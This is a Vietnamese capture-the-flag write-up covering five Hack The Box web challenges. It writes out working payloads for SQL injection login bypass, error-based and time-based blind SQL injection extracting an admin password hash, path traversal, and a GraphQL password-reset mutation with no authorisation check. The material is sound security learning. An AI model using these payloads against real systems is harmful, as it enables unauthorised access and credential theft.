## Hack the box - Trapped Source

```
Intergalactic Ministry of Spies tested Pandora's movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?
```

Giao diện của bài này:

![image](https://user-images.githubusercontent.com/104350480/227524385-325ae8e1-890e-4012-808e-5c000dd542ca.png)

Nhập sai thì sẽ báo invalid và chỉ được nhập 4 chữ số:

![image](https://user-images.githubusercontent.com/104350480/227524514-974f3a2f-b4a2-4152-91dc-e5509413cbc0.png)

Vì không có tham số để truyền vào bruteforce được, ctrl U cái ra luôn: 

![image](https://user-images.githubusercontent.com/104350480/227524698-97e51d98-9558-4839-a55c-f9a38981ee5c.png)

Nhập 8291 được flag: 

![image](https://user-images.githubusercontent.com/104350480/227524873-586ddd45-62f2-41a5-8990-81b12893d96e.png)

> Flag: HTB{V13w_50urc3_c4n_b3_u53ful!!!}


## Hack the box - Gunhead

```
During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.

```
Bài này là một bài cơ bản về command injection. Review source code có: 

![image](https://user-images.githubusercontent.com/104350480/227525978-6c664ea9-1eb5-4a0a-b573-58781cf09281.png)

Có thể thấy không hề có sanitize input nhập vào nên mình có thể thực hiện command injection ở đây được: 

![image](https://user-images.githubusercontent.com/104350480/227527071-abc324b0-0c6d-4e6f-a638-51e25e1ee068.png)

Giờ cần tìm file flag.txt và cat nó ra là xong: 

![image](https://user-images.githubusercontent.com/104350480/227527496-e99f25ed-8d1b-45ff-b962-269806846d76.png)

Và: 

![image](https://user-images.githubusercontent.com/104350480/227527572-ee076e6c-97f0-4ff3-8665-156028aaeb1c.png)

> Flag: HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}

## Hack the box - Drobots

```
Pandora's latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?

```

Giao diện của bài như sau: 

![image](https://user-images.githubusercontent.com/104350480/227527736-a942fdcf-cfe2-4b84-b7b5-068e20595196.png)

Nhìn qua có vẻ bài muốn mình thử sql injection để đăng nhập vào: 

Thử payload: manhhuy2002" OR 1 = 1  -- - 
Mình đăng nhập thành công và có flag: 

![image](https://user-images.githubusercontent.com/104350480/227528579-49de43fb-2014-4461-96ff-a76d3b92a3b9.png)


> FLag: HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}

Còn đọc source thì có thể thấy lỗ hổng bởi việc không có sanitize đầu vào: 

![image](https://user-images.githubusercontent.com/104350480/227528817-c29738ca-a4eb-4f14-8349-877cff388a10.png)


## Hack the box - Orbital

```
In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?

```

Bài có giao diện như sau

![image](https://user-images.githubusercontent.com/104350480/227454300-ec0ed39b-35a7-40d6-989c-96904b3be2a2.png)

Ném qua burpsuite và truy vấn một câu bất kì thử;

![image](https://user-images.githubusercontent.com/104350480/227455150-dcea7336-f348-40dd-8ba3-a63c6b876c82.png)

Nhận được lỗi trả về: 

```
{"error":{"message":["1064","You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'select null,null -- -\"' at line 1"],"type":"ProgrammingError"}}

```

Ở đây nó trả về cho mình biết luôn là đang dùng cơ sở dữ liệu MariaDB, MariaDB là bản phát triển từ mã nguồn Mysql nên mình có thể truy vấn các câu lệnh tương tự như bên Mysql.  Để tiếp tục exploit, mình sẽ dùng một trong những hàm XPATH đuợc sử dụng trong SQL đó là updateXML để trigger ra lỗi và lấy kết quả.

```
UPDATEXML(XMLType_Instance, XPath_string,value_expression, namespace_string)

```

Nếu truy vấn XPath không chính xác mình sẽ nhận được lỗi trả về như sau: 

```
XPATH syntax error: 'xpathqueryhere'
```
Mình sẽ injection với XPATH như sau để dump dữ liệu ra: 
Đầu tiên mình lấy length của password cần:

```
{"username":"admin\" and updatexml(null,concat(0x3a,(select length(password) from users)),null)-- -","password":"123"}

```

![image](https://user-images.githubusercontent.com/104350480/227457723-be81706e-3f77-4027-9988-ae38b7fa3569.png)

password cần lấy ra có độ dài là 32, tiếp tục mình dùng substring để lấy password, ở đây chia ra làm 2 nửa, vì mình thử chỉ được từ 1 đến 31, vẫn phải thử 2 lần: 

```

{"username":"admin\" and updatexml(null,concat(0x3a,(select substring(password,1,16) from users)),null)-- -","password":"123"}


```
> pass1: 1692b753c031f290

```
{"username":"admin\" and updatexml(null,concat(0x3a,(select substring(password,17,32) from users)),null)-- -","password":"123"}

```
> pass2: 5b89e7258dbc49bb

> pass: 1692b753c031f2905b89e7258dbc49bb

Đọc source mình thấy password được lưu ở dạng md5 nên mình đi decrypt thử xem được không: 

![image](https://user-images.githubusercontent.com/104350480/227458488-38227c2b-29e7-4e2e-a7ef-d35fa7265a16.png)

Vậy pass của admin là: ichliebedich

## Ngoài ra mfinh có thể dùng sql injection blind time-based để khai thác: 

Test payload lần lượt là: 

test time-based:
```
{"username":"admin\" and sleep(5) -- -","password":"12"}
```
test độ dài của password: 
```

{"username":"admin\" and (SELECT CASE WHEN ((select length(password) from users limit 1)=32) THEN sleep(5) ELSE sleep(0) END) -- -","password":"12"}

```
Tiếp theo thử từng kí tự của password: 

```
{"username":"admin\" and (SELECT CASE WHEN ((select substring(password,1,1) from users limit 1)>0) THEN sleep(5) ELSE sleep(0) END) -- -","password":"12"}

```

Đợi đến hết rồi mình cũng sẽ được mật khẩu như ở trên: 

![image](https://user-images.githubusercontent.com/104350480/227523675-bb733882-8a01-419e-b962-cdd4f0f1f4a1.png)


### Đăng nhập thành công, mình vào được trang chủ:

![image](https://user-images.githubusercontent.com/104350480/227458727-47a507e6-768b-4f8b-8947-63e979dba82d.png)

Ở đây đọc source code ở phần routes.py mình để ý /api/export có cho phép thực hiện get dữ liệu được truyền dưới dạng json qua tham số name  được truyền trong 1 json payload: 

![image](https://user-images.githubusercontent.com/104350480/227515819-f80fbb3f-e7c2-424e-9552-f83ca2278ad2.png)

Để ý là nếu mình truyền đúng, server sẽ send lại cho mình cái file mà muốn export, ở đây rõ ràng không có cơ chế bảo vệ path traversal tức hoàn toàn có thể control được nó. Giờ cần tìm file chứa flag nữa là xong. Đọc source trong file docker: 

![image](https://user-images.githubusercontent.com/104350480/227516371-465c9ac3-ff3d-421c-a8dc-ad6550cc89ca.png)

File flag.txt được copy và lưu vào nơi có đường dẫn /signal_sleuth_firmware. Oke vậy giờ mình vào trang thực chủ thực hiện export để bắt đường dẫn nữa là xong: 

![image](https://user-images.githubusercontent.com/104350480/227516730-abd25924-c7cd-4fec-a7d9-62ff0efcbed9.png)

Giờ thực hiện path traversal là có được flag: 

![image](https://user-images.githubusercontent.com/104350480/227515568-02540e51-ed27-461b-a65c-12fc2222c6eb.png)

> flag: HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}


## Hack the box - IGMS PASSMAN

```
Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?

```

Giao diện của bài cho như này: 

![image](https://user-images.githubusercontent.com/104350480/227529659-abf4cd95-2748-4f13-a017-785da644693e.png)

Bài này có register nên chắc cần phải đăng nhập:

![image](https://user-images.githubusercontent.com/104350480/227530220-0b13a902-224d-4781-8e5e-bed3d44930a5.png)

Để ý khi bắt qua burpsuite mình được:

![image](https://user-images.githubusercontent.com/104350480/227530626-61d63600-08b4-4490-baa3-449b892cc64b.png)

Bài này đang dùng truy vấn với graphql dạng mutation, mutation được dùng để thêm, sửa và xóa dữ liệu gần tương tự như Post, Put và Delete.
Đọc gợi ý từ đề bài là liệu mình có thể kiểm soát được nơi chứa mật khẩu với đọc source code ở trường mutation thì có một trường có thể khai thác: 

![image](https://user-images.githubusercontent.com/104350480/227531407-fca4ec4f-7733-4108-a784-fde92566ba8d.png)

Là trường UpdatePassword, ở đây có thể thấy nó chỉ kiểm tra xem mình đã được xác thực hay chưa chứ không hề control việc mình có vai trò như thế nào trong hệ thống, nên có thể khai thác trường này bằng việc thực hiện truy vấn dạng mutation. Ở đây chẳng hạn bắt qua burp được:

![image](https://user-images.githubusercontent.com/104350480/227532140-a0fd590e-2504-42dc-9ea6-2e62ce352762.png)

Mình sẽ sửa lại về dạng mutation để sửa mật khẩu admin thành 123456

```
{"query":"mutation { UpdatePassword(username: \"admin\", password: \"123456\") { message } }" }

```

![image](https://user-images.githubusercontent.com/104350480/227536084-13fe3447-6d89-4eef-99cc-440daaf21468.png)

Vậy là mình đã đổi thành công, để biết là admin hay administrator thì có thể ra phần đăng nhập thử nếu trùng thì nó sẽ báo lỗi người dùng đã tồn tại hoặc xem source cũng được. Bây giờ mình đăng nhập vào sẽ được như sau: 

![image](https://user-images.githubusercontent.com/104350480/227536990-1ae51663-7721-45c7-9026-74a0f305c3ad.png)


> Flag: HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}


